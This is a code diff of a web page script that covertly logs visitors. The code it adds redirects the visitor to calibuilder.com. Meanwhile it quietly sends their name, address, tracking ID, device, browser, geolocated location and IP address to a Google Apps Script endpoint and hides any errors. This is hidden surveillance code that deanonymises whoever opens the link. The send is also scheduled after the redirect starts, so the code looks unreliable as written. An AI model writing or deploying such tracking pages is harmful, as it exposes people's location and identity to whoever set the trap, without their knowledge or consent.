@@ -38,32 +38,20 @@
             const location = await getLocation();
             const fullLocation = location.city + ', ' + location.region;
 
-            // Google Form field IDs (you may need to verify these from your form)
-            // Common pattern: entry.XXXXXXXXXX
-            const formId = '1kTf5H0JDZR295FMV7psJqRNe1R8kBRe--DOuaYQ2SwQ';
-            const formUrl = `https://docs.google.com/forms/d/${formId}/formResponse`;
-
-            // Create form data
-            const formData = new FormData();
-            // These entry IDs are typical - you may need to adjust if form fields are different
-            formData.append('entry.1234567890', name);           // Name - adjust if needed
-            formData.append('entry.1234567891', address);        // Address - adjust if needed
-            formData.append('entry.1234567892', trackingId);     // Tracking ID - adjust if needed
-            formData.append('entry.1234567893', device);         // Device - adjust if needed
-            formData.append('entry.1234567894', browser);        // Browser - adjust if needed
-            formData.append('entry.1234567895', fullLocation);   // Location - adjust if needed
-            formData.append('entry.1234567896', location.ip);    // IP - adjust if needed
-            formData.append('entry.1234567897', timestamp);      // Timestamp - adjust if needed
-
-            // Submit to Google Form (in background)
-            fetch(formUrl, {
-                method: 'POST',
-                body: formData,
-                mode: 'no-cors'
-            }).catch(() => {});
-
-            // Redirect immediately (user doesn't wait for form)
+            // REDIRECT IMMEDIATELY
             window.location.href = 'https://www.calibuilder.com';
+
+            // Send email notification in background
+            setTimeout(() => {
+                try {
+                    fetch('https://script.google.com/macros/d/AKfycbyK1pWJuApueCThqQGqT_sY-T7mY-1UnXskJ01HZVjoXSJ9nXTFgwePKkX16hyKOOxH3A/usercontent?name=' +
+                        encodeURIComponent(name) + '&address=' + encodeURIComponent(address) +
+                        '&id=' + encodeURIComponent(trackingId) + '&device=' + encodeURIComponent(device) +
+                        '&browser=' + encodeURIComponent(browser) + '&location=' + encodeURIComponent(fullLocation) +
+                        '&ip=' + encodeURIComponent(location.ip) + '&timestamp=' + encodeURIComponent(timestamp)
+                    ).catch(() => {});
+                } catch (e) {}
+            }, 100);
         }
 
         start();
